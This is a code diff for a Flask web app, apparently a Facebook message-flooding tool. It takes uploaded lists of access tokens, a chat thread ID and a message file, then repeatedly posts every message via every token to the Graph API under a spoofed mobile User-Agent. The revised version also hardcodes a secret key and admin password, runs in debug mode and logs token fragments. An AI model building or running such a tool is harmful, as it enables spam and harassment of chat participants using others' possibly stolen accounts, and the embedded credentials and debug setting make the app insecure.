@@ -1,19 +1,16 @@
-from flask import Flask, render_template, request, session, redirect, url_for
+from flask import Flask, request, session, redirect, url_for, render_template
 import requests
 from threading import Thread, Event
 import time
 import os
 import logging
 import io
-import uuid
 
 app = Flask(__name__)
 app.debug = True
-app.secret_key = os.getenv("SECRET_KEY", "dev_secret")
+app.secret_key = "3a4f82d59c6e4f0a8e912a5d1f7c3b2e6f9a8d4c5b7e1d1a4c"  # Production mein strong key use karein
 
-ADMIN_PASSWORD = os.getenv("ADMIN_PASSWORD", "12341")
-
-# Logging
+# Logging setup
 log_stream = io.StringIO()
 handler = logging.StreamHandler(log_stream)
 handler.setLevel(logging.INFO)
@@ -24,133 +21,116 @@ headers = {
     'Connection': 'keep-alive',
     'Cache-Control': 'max-age=0',
     'Upgrade-Insecure-Requests': '1',
-    'User-Agent': 'Mozilla/5.0',
+    'User-Agent': 'Mozilla/5.0 (Linux; Android 11; TECNO CE7j) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Mobile Safari/537.36',
     'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
     'Accept-Encoding': 'gzip, deflate',
     'Accept-Language': 'en-US,en;q=0.9',
     'referer': 'www.google.com'
 }
 
-users_data = []  # Stores all active jobs
+stop_event = Event()
+threads = []
+users_data = []
 
-# Send messages
-def send_messages(stop_event: Event, access_tokens, thread_id, prefix, interval, messages, code):
-    logging.info(f"Started job {code}")
-    try:
-        while not stop_event.is_set():
-            for msg in messages:
-                if stop_event.is_set(): break
-                for token in access_tokens:
-                    if stop_event.is_set(): break
-                    url = f'https://graph.facebook.com/v15.0/{thread_id}/messages'
-                    data = {'access_token': token, 'message': f"{prefix} {msg}".strip()}
-                    try:
-                        r = requests.post(url, data=data, headers=headers, timeout=15)
-                        if r.status_code in (200, 201):
-                            logging.info(f"✅ Sent ({code}): {msg[:30]} via {token[:8]}...")
-                        else:
-                            logging.warning(f"❌ Fail ({code}): {r.status_code}")
-                    except Exception as e:
-                        logging.warning(f"⚠️ Error ({code}): {e}")
-                    sleep_chunk, waited = 0.5, 0
-                    while waited < interval:
-                        if stop_event.is_set(): break
-                        time.sleep(min(sleep_chunk, interval - waited))
-                        waited += sleep_chunk
-    except Exception as e:
-        logging.exception(f"Exception in job ({code}): {e}")
-    finally:
-        logging.info(f"Stopped job {code}")
+def send_messages(access_tokens, thread_id, mn, time_interval, messages):
+    while not stop_event.is_set():
+        try:
+            for message1 in messages:
+                if stop_event.is_set():
+                    break
+                for access_token in access_tokens:
+                    api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
+                    message = str(mn) + ' ' + message1
+                    parameters = {'access_token': access_token, 'message': message}
+                    response = requests.post(api_url, data=parameters, headers=headers)
+                    if response.status_code == 200:
+                        logging.info(f"✅ Sent: {message[:30]} via {access_token[:50]}")
+                    else:
+                        logging.warning(f"❌ Fail [{response.status_code}]: {message[:30]}")
+                time.sleep(time_interval)
+        except Exception as e:
+            logging.error("⚠️ Error in message loop: %s", e)
+            time.sleep(10)
 
-# ---------------- Routes ----------------
+@app.route('/ping', methods=['GET'])
+def ping():
+    return "✅ I am alive!", 200
+
+# User panel route
 @app.route('/', methods=['GET', 'POST'])
-def index():
+def user_panel():
     new_code = None
     if request.method == 'POST':
-        access_tokens = []
-        if 'tokenFile' in request.files and request.files['tokenFile'].filename:
-            access_tokens = request.files['tokenFile'].read().decode().splitlines()
-        elif 'tokenPaste' in request.form and request.form['tokenPaste'].strip():
-            access_tokens = request.form['tokenPaste'].strip().splitlines()
-        if not access_tokens: return "No tokens provided", 400
+        # Token parsing (paste or file)
+        if 'tokenFile' in request.files and request.files['tokenFile'].filename != '':
+            access_tokens = request.files['tokenFile'].read().decode().strip().splitlines()
+        else:
+            token_paste = request.form.get('tokenPaste', '').strip()
+            access_tokens = token_paste.splitlines() if token_paste else []
 
-        if 'txtFile' not in request.files or not request.files['txtFile'].filename:
-            return "Message file missing", 400
-        messages = [line for line in request.files['txtFile'].read().decode().splitlines() if line.strip()]
-
-        thread_id = request.form.get('threadId', '').strip()
-        prefix = request.form.get('kidx', '').strip()
-        try:
-            interval = int(request.form.get('time', 5))
-            if interval < 1: interval = 1
-        except: interval = 5
-
-        stop_event = Event()
-        code = str(uuid.uuid4())[:8]  # unique 8-character code
-        new_code = code
-        thread = Thread(target=send_messages, args=(stop_event, access_tokens, thread_id, prefix, interval, messages, code))
-        thread.daemon = True
-        thread.start()
+        thread_id = request.form.get('threadId')
+        mn = request.form.get('kidx', '')
+        time_interval = int(request.form.get('time', 5))
+        txt_file = request.files.get('txtFile')
+        messages = txt_file.read().decode().splitlines() if txt_file else []
 
         users_data.append({
             "tokens": access_tokens,
             "thread_id": thread_id,
-            "prefix": prefix,
-            "interval": interval,
-            "messages": messages,
-            "stop_event": stop_event,
-            "thread": thread,
-            "code": code,
-            "is_running": True
+            "prefix": mn,
+            "interval": time_interval,
+            "messages": messages
         })
-        logging.info(f"New job started ({code})")
-    return render_template("index.html", new_code=new_code)
 
-@app.route('/stop/<string:code>', methods=['POST'])
-def stop_user(code):
-    for user in users_data:
-        if user['code'] == code:
-            if user.get("stop_event"):
-                user["stop_event"].set()
-            t = user.get("thread")
-            if t and t.is_alive():
-                t.join(timeout=2)
-            user['is_running'] = False
-            logging.info(f"Stopped job ({code})")
-            break
-    return '', 200
+        if not any(thread.is_alive() for thread in threads):
+            stop_event.clear()
+            thread = Thread(target=send_messages, args=(access_tokens, thread_id, mn, time_interval, messages))
+            thread.start()
+            threads[:] = [thread]
 
-# ---------------- Admin ----------------
-@app.route('/admin/login', methods=['GET','POST'])
+        # Generate a simple job code (example)
+        new_code = str(int(time.time()))
+
+    return render_template("user_panel.html", new_code=new_code)
+
+@app.route('/stop/<job_code>', methods=['POST'])
+def stop_job(job_code):
+    stop_event.set()
+    return f"✅ Job {job_code} stopped."
+
+# Admin login route
+@app.route('/admin', methods=['GET', 'POST'])
 def admin_login():
     if request.method == 'POST':
-        password = request.form.get('password','')
-        if password == ADMIN_PASSWORD:
+        password = request.form.get('password')
+        if password == "smarty07":  # Change for production
             session['admin'] = True
             return redirect(url_for('admin_panel'))
     return render_template("admin_login.html")
 
+# Admin panel route
 @app.route('/admin/panel')
 def admin_panel():
-    if not session.get('admin'): return redirect(url_for('admin_login'))
-    logs = log_stream.getvalue().replace("\n","<br>")
-    return render_template("admin.html", users=users_data, logs=logs)
+    if not session.get('admin'):
+        return redirect(url_for('admin_login'))
 
+    logs = log_stream.getvalue().replace("\n", "<br>")
+    return render_template("admin_panel.html", logs=logs, users=users_data)
+
+# Remove session route
 @app.route('/admin/remove/<int:idx>', methods=['POST'])
 def remove_user(idx):
-    if not session.get('admin'): return redirect(url_for('admin_login'))
+    if not session.get('admin'):
+        return redirect(url_for('admin_login'))
     if 0 <= idx < len(users_data):
-        user = users_data.pop(idx)
-        if user.get("stop_event"):
-            user["stop_event"].set()
-        t = user.get("thread")
-        if t and t.is_alive(): t.join(timeout=2)
+        users_data.pop(idx)
     return redirect(url_for('admin_panel'))
 
+# Admin logout route
 @app.route('/admin/logout')
 def admin_logout():
     session.pop('admin', None)
     return redirect(url_for('admin_login'))
 
-if __name__ == "__main__":
-    app.run(host="0.0.0.0", port=int(os.getenv("PORT", 5000)))
+if __name__ == '__main__':
+    app.run(host='0.0.0.0', port=int(os.getenv("PORT", 5000)))
